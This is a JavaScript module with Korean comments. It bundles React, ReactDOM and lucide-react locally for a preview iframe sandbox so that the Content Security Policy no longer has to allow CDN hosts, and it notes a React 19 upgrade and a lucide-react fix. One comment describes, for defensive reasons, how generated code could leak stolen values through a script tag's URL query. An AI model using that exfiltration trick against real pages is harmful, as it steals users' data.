// ★★★ [E0-1A] Preview 샌드박스가 쓰는 전역들을 **로컬 패키지에서** 만든다.
//
// 종전에 iframe 은 이것들을 CDN 에서 받았다.
//     unpkg.com/react@18 · unpkg.com/react-dom@18 · unpkg.com/lucide@latest
//     unpkg.com/@babel/standalone · cdn.tailwindcss.com
// 그래서 CSP 의 `script-src` 에 그 호스트들을 열어야 했고, **열린 호스트는 곧 나가는 길**이다
// — 생성 코드가 `<script src="https://…/?leak=" + 훔친값>` 하나로 데이터를 실어 보낼 수 있다.
// `connect-src 'none'` 으로 fetch·XHR·WebSocket 을 다 막아 놓고도 그 구멍만 남아 있었다.
//
// 이 파일을 IIFE 로 묶어 `public/preview-vendor/runtime.js` 로 떨군다. 부모가 그것을
// **같은 출처에서 읽어 srcDoc 안에 그대로 적어 넣는다** — 즉 iframe 은 어떤 호스트에도
// 요청하지 않는다. CSP 에서 호스트가 전부 사라진다.
//
// ⚠️ React 18 → **19**. 로컬 패키지를 쓰므로 앱 본체와 같은 버전이 된다. `ReactDOM.render`
//   (레거시)는 19 에서 사라졌지만 이 템플릿은 원래 `createRoot` 를 쓰므로 영향이 없다.
// ⚠️ `lucide-react` 를 **진짜 lucide-react** 로 바꿨다. 종전에는 바닐라 `lucide`(아이콘
//   데이터)를 `lucide-react`(React 컴포넌트) 자리에 끼워 넣고 있었다 — 생성 코드가
//   `import { Check } from 'lucide-react'` 를 하면 컴포넌트가 아닌 객체가 와서 렌더가 깨졌다.
import * as React from 'react';
import * as ReactDOMClient from 'react-dom/client';
import * as Lucide from 'lucide-react';

const g = /** @type {any} */ (window);
g.React = React;
g.ReactDOM = ReactDOMClient;
g.lucide = Lucide;
//: 생성 코드가 `import ... from 'lucide-react'` 로 받을 이름. `makeRequire` 가 이것을 준다.
g.LucideReact = Lucide;
